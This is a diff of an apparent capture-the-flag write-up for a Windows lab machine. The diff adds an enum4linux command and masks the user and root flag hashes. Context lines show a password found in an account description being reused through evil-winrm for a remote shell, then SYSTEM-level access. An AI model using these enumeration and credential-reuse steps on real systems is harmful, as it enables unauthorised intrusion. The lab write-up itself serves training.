@@ -65,9 +65,10 @@ Host script results:
 
 ## Initial access
 ```
-[...
+$ enum4linux 10.10.10.169
+[...]
 index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
-[...
+[...]
 ```
 
 This also resulted in a full list of usernames:
@@ -126,7 +127,7 @@ The credentials ended up not working for Marko's account, however they did work 
 $ evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
 [...]
 *Evil-WinRM* PS C:\Users\melanie\Documents> type ../Desktop/user.txt
-0503bcbc5a2ba4a6fbfff9db0093a07d
+0503[...]a07d
 ```
 
 ```
@@ -254,5 +255,5 @@ nt authority\system
 [...]
 C:\Windows\system32>type \users\Administrator\Desktop\root.txt
 type \users\Administrator\Desktop\root.txt
-f57db0eae504e9665e01681beeb5909a
+f57d[...]909a
 ```
